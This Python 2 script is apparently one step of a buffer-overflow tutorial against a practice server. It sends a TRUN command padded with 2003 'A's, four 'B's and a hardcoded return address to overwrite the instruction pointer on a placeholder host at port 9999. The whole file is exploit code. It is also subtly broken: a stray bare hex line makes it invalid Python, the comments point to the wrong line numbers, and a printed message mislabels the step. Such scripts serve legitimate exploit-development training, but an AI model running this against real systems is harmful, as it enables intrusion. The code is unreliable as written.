#!/usr/bin/python2
import sys, socket

# change the address on line 8 and  10 to one you found in last step 
# Change IP and Port on line 15 to Target and Port Application is running on
# Change TRUN on line 16 to Command you are testing

625011AF

shellcode = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62"

try:
    print "\nLocating Bad Characters..."
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:            
    print "\nError Connecting to Server"
    sys.exit()
